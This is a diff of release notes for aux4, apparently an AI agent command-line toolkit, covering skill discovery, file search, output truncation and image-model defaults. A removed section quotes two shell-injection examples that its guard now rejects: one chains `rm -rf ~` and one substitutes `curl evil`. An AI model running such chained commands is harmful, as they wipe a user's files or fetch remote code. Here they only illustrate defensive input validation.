@@ -1,48 +1,70 @@
 # Release notes
 
-## `executeAux4` takes the full command
+## Skills are a tool, not a preamble
 
-The tool used to strip a leading `aux4`, so models had to learn an exception ("pkger, man and
-which keep the prefix") rather than a rule. They generalised it wrongly in both directions —
-dropping the prefix everywhere, or adding it everywhere, turning `aux4 email --help` into
-`aux4 aux4 email --help`.
+Installed aux4 skills were advertised by injecting a catalog into every agent's system prompt,
+with an instruction to check for a matching skill "before running anything else". On a one-command
+task that is wrong: a task to open a browser went hunting for the web skill, tried `aux4 web
+navigate`, and never ran the command. Removing the injection took that task from 0/3 back to 3/3.
 
-Commands are now written exactly as typed in a terminal, including the leading `aux4`. Since
-`aux4 X` reads as "auxiliary for X", `aux4 aux4 pkger` needs no special rule. The stripped form
-still works.
+Discovery now belongs to a tool, bound only by the agents that want it:
 
-Measured on a 36-task eval driving a local 4B model: this took it from 3.0/5 to 4.8/5 on the
-earlier suite, and removed the run-to-run variance.
+```
+aux4Skill()              -> the installed skills, as an index
+aux4Skill(skill: "web")  -> that skill's full instructions
+```
 
-## `executeAux4` runs only aux4 commands
+Agents that bind it fetch a skill when the task calls for one and pay nothing when it does not.
+The no-argument response says plainly that it is an index and the skill still has to be read —
+listing was being mistaken for having consulted it.
 
-Commands execute through `sh -c`, so shell operators could previously chain any binary
-(`aux4 version; rm -rf ~`) or substitute one (`aux4 $(curl evil)`). Those are now rejected
-before execution: one aux4 command per call, no `;` `&&` `||` `|` `` ` `` `$()` or redirects.
+## `searchText` — find the part of a file you need
 
-## `--tools` binds a subset of tools
+A truncated result names the file its full output was written to, but reading it back meant
+paging through the whole thing. `searchText` ranks passages inside a single file and returns them
+with line numbers, so a caller can ask for the section that matters:
 
-All 14 tool descriptions were sent on every request whether or not a tool was used. `--tools
-executeAux4` binds only what a task needs, taking the per-request floor from ~12,200 tokens to
-~700.
+```bash
+searchText(file: "/tmp/aux4-exec-…​.stdout", query: "open a new browser session")
+# [line 33]
+#   open
+#   Open a new browser session.
+```
 
-## Tool documentation moved behind `readReference`
+Indexing happens per call on one file — there is no corpus to build or keep fresh.
 
-Each tool description now keeps inline only what is needed to call it correctly — what it does,
-the rules that change the outcome, its parameters and what it returns — with the detail in
-`instructions/references/<tool>.md`, fetched on demand. Nothing is lost.
+## Truncated output keeps its head
 
-The all-tools floor drops from ~12,200 to ~3,400 tokens per request.
+Output above the limit was truncated to its **last** 10KB. That is right for a log and wrong for
+the most common case: `<command> --help`, where the command list is at the top. A 12.8KB help page
+came back as trailing flag defaults with the subcommands deleted, so an agent asking the correct
+question could not find the command it needed.
 
-## `awsSigv4` for AWS OpenAI-compatible endpoints
+Truncation now keeps 60% head + 40% tail with the omitted byte count in between, and the notice
+points at the tools that can read the rest:
 
-`type: openai` with `config.awsSigv4: { region, service }` signs requests using the standard AWS
-credential chain, so an endpoint such as Bedrock's OpenAI-compatible API needs no API key minted
-or stored.
+```
+[...2806 bytes omitted...]
+[Output truncated: 12806 bytes total. The full output is at /tmp/… -- use searchText on that
+ file to find the part you need, or readFile with an offset.]
+```
 
-## Also
+## Image generation: default is now `gpt-image-1`
 
-- `readReference` resolves the configured references directory first, then the built-in one
-  shipped with the package, so internal tool references work without passing `--references`.
-- New tests: `file-tools.test.md` asserts the file tools' effect on disk, and
-  `execute-aux4-guard.test.md` pins the shell-operator rejection.
+The OpenAI default was `dall-e-3`, and image generation failed outright with
+`400 Unknown parameter: 'response_format'` — the parameter DALL·E accepted and the newer models
+reject.
+
+**This changes cost.** `gpt-image-1` is priced differently from `dall-e-3` and supports only
+`1024x1024` among the old sizes. Pass `--model` to pick another, including the cheaper
+`gpt-image-1-mini`:
+
+```bash
+aux4 ai agent image --prompt "…" --image out.png \
+  --model '{"type":"openai","config":{"model":"gpt-image-1-mini"}}'
+```
+
+### Notes
+
+- `searchText` ranks by word overlap; a few plain words work better than a sentence.
+- The head/tail split and the 10KB limit are not configurable yet.
